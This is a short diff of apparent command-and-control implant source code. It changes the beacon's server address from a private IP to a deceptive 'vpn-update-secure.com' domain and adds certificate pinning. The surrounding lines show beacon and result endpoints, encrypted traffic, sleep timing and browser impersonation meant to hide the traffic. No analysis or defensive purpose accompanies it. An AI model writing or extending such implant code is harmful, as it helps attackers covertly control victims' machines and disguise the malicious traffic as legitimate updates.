@@ -11,7 +11,7 @@ import platform
 from Encryption import encrypt_data, decrypt_data
 from curl_cffi.requests import Session
 #Configuration
-SERVER = 'http://10.116.64.182:8443' # YOUR SERVER IP
+SERVER = 'http://vpn-update-secure.com:5000' # YOUR SERVER IP
 BEACON_ENDPOINT = "/api/beacon"
 RESULT_ENDPOINT = '/api/result'
 SLEEP_MIN= 10
@@ -51,6 +51,7 @@ def get_session():
     session = Session(
         impersonate=impersonate,
         timeout=30,
+        verify="server.crt"
     )
     if family == "chrome":
         headers = {
